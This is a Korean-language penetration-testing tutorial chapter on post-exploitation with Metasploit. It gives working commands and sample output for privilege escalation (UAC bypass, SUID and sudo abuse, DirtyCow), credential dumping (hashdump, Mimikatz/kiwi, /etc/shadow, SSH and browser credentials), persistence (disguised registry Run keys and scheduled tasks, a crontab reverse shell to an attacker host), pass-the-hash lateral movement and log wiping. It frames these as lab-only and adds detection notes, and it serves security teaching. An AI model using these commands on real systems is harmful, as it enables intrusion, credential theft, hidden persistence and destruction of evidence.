Chapter 08

포스트 익스플로잇

초기 침투 이후의 단계 — 권한 상승, 자격증명 수집, 지속성 유지, 횡적 이동까지 실전 포스트 익스플로잇 전략

⛔
실습 환경 경고

이 챕터의 모든 기법은 Metasploitable 또는 허가된 실습 환경에서만 실행하세요. 실제 시스템에 적용 시 중대한 법적 책임이 발생합니다.

🗺️ 포스트 익스플로잇 로드맵

침투 성공 후의 단계를 흔히 Post-Exploitation이라고 합니다. 단순히 쉘을 얻는 것에서 끝나지 않고, 실제 레드팀 작전에서는 아래의 단계가 체계적으로 수행됩니다.

🗺️
포스트 익스플로잇 5단계
  1. Situational Awareness — 내가 어디 있는지 파악 (sysinfo, getuid, getpid)
  2. Privilege Escalation — 권한 상승 (local_exploit_suggester, getsystem)
  3. Credential Harvesting — 자격증명 수집 (hashdump, mimikatz)
  4. Persistence — 지속성 유지 (레지스트리, 서비스, 스케줄러)
  5. Lateral Movement — 횡적 이동 (psexec, autoroute, socks)

🔍 1단계: 상황 인식 (Situational Awareness)

쉘을 획득한 직후 가장 먼저 해야 할 일은 현재 내 위치와 권한을 파악하는 것입니다. Meterpreter는 이를 위한 풍부한 명령어를 제공합니다.

🖥️ 기본 상황 파악 명령어
# 시스템 기본 정보
meterpreter > sysinfo
Computer        : WINSERVER2019
OS              : Windows 2019 (10.0 Build 17763)
Architecture    : x64
System Language : ko_KR
Logged On Users : 3
Meterpreter     : x64/windows

# 현재 사용자 및 권한
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# 현재 프로세스 ID
meterpreter > getpid
Current pid: 1432

# 네트워크 정보 (내부 네트워크 확인)
meterpreter > ipconfig

# 라우팅 테이블
meterpreter > route

# 실행 중인 프로세스 목록
meterpreter > ps

# 환경 변수
meterpreter > env

# 로컬 포트 확인
meterpreter > netstat
🐧 Linux 상황 파악
# 쉘 업그레이드
meterpreter > shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

# 사용자 확인
$ id
uid=0(root) gid=0(root) groups=0(root)

# 네트워크 인터페이스
$ ip a
$ ifconfig -a

# 내부 호스트 디스커버리
$ cat /etc/hosts
$ arp -a

# 실행 중인 서비스
$ netstat -tulnp 2>/dev/null || ss -tulnp

# sudo 권한 확인
$ sudo -l
💡
자동화된 상황 파악

MSF의 post/multi/recon/local_exploit_suggester나 Linux의 LinPEAS, Windows의 WinPEAS 같은 도구를 활용하면 시스템 취약점을 자동으로 열거할 수 있습니다.

⬆️ 2단계: 권한 상승 (Privilege Escalation)

대부분의 경우 초기 침투 시 일반 사용자 권한을 얻게 됩니다. 권한 상승은 SYSTEM 또는 root 권한 획득을 목표로 합니다.

Windows 권한 상승

local_exploit_suggester 모듈은 현재 시스템에 적용 가능한 로컬 익스플로잇을 자동으로 검색합니다.

🪟 Windows 권한 상승 — local_exploit_suggester
# 현재 세션을 백그라운드로 전환
meterpreter > background
[*] Backgrounding session 1...

# local_exploit_suggester 실행
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run

[*] 192.168.56.102 - Collecting local exploits for x64/windows...
[+] 192.168.56.102 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 192.168.56.102 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target appears to be vulnerable.
[+] 192.168.56.102 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.

# getsystem — 토큰 도용을 통한 SYSTEM 권한 획득 시도
msf6 > sessions -i 1
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
🪟 UAC 우회 — bypassuac
# UAC가 활성화된 경우 getsystem 실패 → bypassuac 모듈 사용
msf6 > use exploit/windows/local/bypassuac_fodhelper
msf6 exploit(bypassuac_fodhelper) > set SESSION 1
msf6 exploit(bypassuac_fodhelper) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(bypassuac_fodhelper) > set LHOST 192.168.56.1
msf6 exploit(bypassuac_fodhelper) > run

[*] Started reverse TCP handler on 192.168.56.1:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[*] Meterpreter session 2 opened

# 새 세션에서 getsystem 재시도
msf6 > sessions -i 2
meterpreter > getsystem
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

Linux 권한 상승

Linux에서는 커널 취약점, SUID 파일, sudo 미스컨피그 등 다양한 경로로 권한 상승이 가능합니다.

🐧 Linux 권한 상승 — SUID 찾기
# SUID 비트 설정된 파일 검색
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/find
/usr/bin/nmap    # nmap 5.x에 --interactive 옵션 존재!

# nmap SUID 권한 상승 (레거시)
$ nmap --interactive
nmap> !sh
# id
uid=0(root) gid=1000(user)

# sudo 권한 오남용
$ sudo -l
(ALL) NOPASSWD: /usr/bin/vim

$ sudo vim -c ':!/bin/bash'
# id
uid=0(root)
🐧 커널 취약점 — DirtyCow (CVE-2016-5195)
# MSF에서 DirtyCow 모듈 검색
msf6 > search dirtycow
# exploit/linux/local/dirtycow

msf6 > use exploit/linux/local/dirtycow
msf6 exploit(dirtycow) > set SESSION 1
msf6 exploit(dirtycow) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(dirtycow) > set LHOST 192.168.56.1
msf6 exploit(dirtycow) > run

[*] Started reverse TCP handler
[*] Launching exploit...
[+] Exploit completed, got shell as root!

🔑 3단계: 자격증명 수집 (Credential Harvesting)

SYSTEM 또는 root 권한을 획득한 후에는 시스템에 저장된 자격증명을 수집합니다. 이는 횡적 이동의 핵심 재료가 됩니다.

🔑 hashdump — SAM 데이터베이스 덤프
# SYSTEM 권한 확인 후 hashdump 실행
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user1:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# 형식: 사용자명:RID:LM해시:NTLM해시:::
# LM해시가 aad3b435... 이면 LM 비활성화 상태
# NTLM 해시를 hashcat/john으로 크래킹

# hashcat으로 NTLM 크래킹 (외부 도구)
$ hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
🔑 Kiwi (Mimikatz) — 평문 패스워드 추출
# kiwi 확장 모듈 로드 (64비트 프로세스로 마이그레이션 필요)
meterpreter > ps
# lsass.exe 또는 x64 프로세스 PID 확인

meterpreter > migrate 668   # winlogon.exe 등 x64 프로세스
meterpreter > load kiwi
[+] kiwi v2.0.0 loaded

# 로그인 자격증명 덤프 (평문 포함)
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
wdigest credentials
===================
 Username  Domain    Password
 --------  ------    --------
 admin     WORKGROUP Password123!
 user1     WORKGROUP Summer2024@

# LSA 비밀 덤프
meterpreter > lsa_dump_secrets

# SAM 해시 덤프 (kiwi 방식)
meterpreter > lsa_dump_sam
⚠️
Windows 10/11 WDigest 주의사항

Windows 8.1/2012 R2 이후부터는 기본적으로 WDigest 인증이 비활성화되어 평문 패스워드가 메모리에 저장되지 않습니다. 레지스트리를 수정하거나 재로그인을 유도하는 추가 기법이 필요합니다.

🐧 Linux 자격증명 수집
# /etc/shadow 덤프 (root 권한 필요)
meterpreter > cat /etc/shadow
root:$6$rounds=5000$salt$hash...:18000:0:99999:7:::
user1:$6$rounds=5000$abc$hash...:18000:0:99999:7:::

# MSF post 모듈로 해시 수집
msf6 > use post/linux/gather/hashdump
msf6 post(hashdump) > set SESSION 1
msf6 post(hashdump) > run
[+] Unshadowed Password File:
root:$6$...hash...::...

# SSH 키 수집
msf6 > use post/multi/gather/ssh_creds
msf6 post(ssh_creds) > set SESSION 1
msf6 post(ssh_creds) > run

# 브라우저 저장 비밀번호
msf6 > use post/multi/gather/firefox_creds
msf6 > use post/multi/gather/chrome_creds

🔒 4단계: 지속성 유지 (Persistence)

재부팅 후에도 접근이 유지되도록 백도어나 스케줄 작업을 등록합니다. 실제 레드팀 작전에서는 여러 겹의 지속성 메커니즘을 사용합니다.

🪟 Windows — 레지스트리 지속성
# persistence_exe 모듈 — 실행 파일을 시작프로그램에 등록
msf6 > use post/windows/manage/persistence_exe
msf6 post(persistence_exe) > set SESSION 1
msf6 post(persistence_exe) > set STARTUP REGISTRY
msf6 post(persistence_exe) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 post(persistence_exe) > set LHOST 192.168.56.1
msf6 post(persistence_exe) > set LPORT 4445
msf6 post(persistence_exe) > run

[+] Persistent backdoor installed in HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# 수동 레지스트리 등록 (Meterpreter 직접)
meterpreter > reg setval -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' \
  -v 'WindowsUpdate' \
  -d 'C:\Users\Public\update.exe'
🪟 Windows — 예약 작업
# 스케줄러를 통한 지속성
meterpreter > shell
C:\> schtasks /create /tn "WindowsDefenderUpdate" \
     /tr "C:\Users\Public\payload.exe" \
     /sc onlogon /ru SYSTEM /f

# 서비스 등록을 통한 지속성
msf6 > use post/windows/manage/persistence
msf6 post(persistence) > set SESSION 1
msf6 post(persistence) > set STARTUP SERVICE
msf6 post(persistence) > run
🐧 Linux — Crontab 지속성
# crontab에 리버스 쉘 등록
meterpreter > shell
$ crontab -e

# 매 분마다 리버스 쉘 연결 시도
* * * * * /bin/bash -i >& /dev/tcp/192.168.56.1/4446 0>&1

# 또는 MSF post 모듈 사용
msf6 > use post/linux/manage/cron_persistence
msf6 post(cron_persistence) > set SESSION 1
msf6 post(cron_persistence) > set TIMING "* * * * *"
msf6 post(cron_persistence) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 post(cron_persistence) > set LHOST 192.168.56.1
msf6 post(cron_persistence) > run

# SSH 인가 키 추가 (가장 안정적인 방법)
$ echo "ssh-rsa AAAA...공개키..." >> ~/.ssh/authorized_keys
$ chmod 600 ~/.ssh/authorized_keys
⚠️
침투 테스트 후 정리 필수

실제 침투 테스트에서는 작업 완료 후 반드시 생성한 모든 백도어, 파일, 레지스트리 항목을 삭제해야 합니다. 지속성 메커니즘을 방치하면 제3자가 악용할 수 있으며 법적 책임도 발생합니다.

↔️ 5단계: 횡적 이동 (Lateral Movement)

하나의 시스템을 장악한 후 내부 네트워크의 다른 시스템으로 이동합니다. 수집한 자격증명과 네트워크 피벗 기법을 조합합니다.

🌐 autoroute + socks — 네트워크 피벗
# 1. 내부 네트워크 정보 확인
meterpreter > ipconfig
# Interface 1: 192.168.56.101 (외부망)
# Interface 2: 10.10.10.5 (내부망) ← 새로 발견된 네트워크!

# 2. autoroute로 내부망 라우팅 추가
meterpreter > run post/multi/manage/autoroute SUBNET=10.10.10.0/24
[+] Route added to subnet 10.10.10.0/24

# 또는 배경 세션 후 MSF에서 직접
msf6 > route add 10.10.10.0/24 1   # 세션 1을 통해 라우팅
msf6 > route print

# 3. SOCKS 프록시 설정 (내부망 직접 접근)
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j
[*] Auxiliary module running as background job

# 4. proxychains로 내부망 접근
$ proxychains nmap -sT -Pn 10.10.10.0/24
$ proxychains curl http://10.10.10.10/
$ proxychains ssh user@10.10.10.20
🔀 psexec — Pass-the-Hash 공격
# hashdump로 획득한 해시로 다른 시스템에 인증
# (동일 패스워드를 사용하는 다른 시스템 공략)

msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set RHOSTS 10.10.10.20
msf6 exploit(psexec) > set SMBUser Administrator
# 평문 패스워드 대신 NTLM 해시 사용
msf6 exploit(psexec) > set SMBPass aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
msf6 exploit(psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(psexec) > set LHOST 192.168.56.1
msf6 exploit(psexec) > run

[*] Started reverse TCP handler
[*] Connecting to the server...
[+] 10.10.10.20:445 - Meterpreter session 3 opened
🔀 WMI / SMB — 추가 횡적 이동 기법
# WMI를 통한 원격 명령 실행
msf6 > use exploit/windows/local/wmi
# 또는 auxiliary/scanner/smb/smb_login 으로 자격증명 검증

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(smb_login) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(smb_login) > set SMBUser Administrator
msf6 auxiliary(smb_login) > set SMBPass Password123!
msf6 auxiliary(smb_login) > run
[+] 10.10.10.15:445 - Success: '.\Administrator:Password123!'
[+] 10.10.10.22:445 - Success: '.\Administrator:Password123!'

# 발견된 모든 호스트에 psexec 적용
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set RHOSTS 10.10.10.15,10.10.10.22

🧹 흔적 제거 (Covering Tracks)

실제 침투 테스트에서는 모든 작업이 기록되어야 하지만, 모의 해킹 관점에서 공격자가 어떻게 흔적을 지우는지 이해하는 것도 중요합니다.

🧹 로그 삭제 및 흔적 제거
# Windows 이벤트 로그 삭제
meterpreter > clearev
[*] Wiping 97 records from Application...
[*] Wiping 415 records from System...
[*] Wiping 227 records from Security...

# Linux bash 히스토리 삭제
meterpreter > shell
$ export HISTSIZE=0
$ unset HISTFILE
$ history -c && history -w

# 업로드한 파일 삭제
meterpreter > rm C:\\Users\\Public\\payload.exe

# 타임스탬프 수정 (timestomping)
meterpreter > timestomp C:\\malware.exe -z "01/01/2020 08:00:00"
📝
방어 관점 — 탐지 포인트

포스트 익스플로잇 활동은 다음 지표로 탐지됩니다: LSASS 프로세스 접근, SAM 파일 읽기, 비정상적인 레지스트리 Run 키 수정, 예약 작업 생성, PowerShell 원격 실행, 비정상적인 SMB 트래픽. SIEM과 EDR 솔루션은 이러한 패턴을 모니터링합니다.
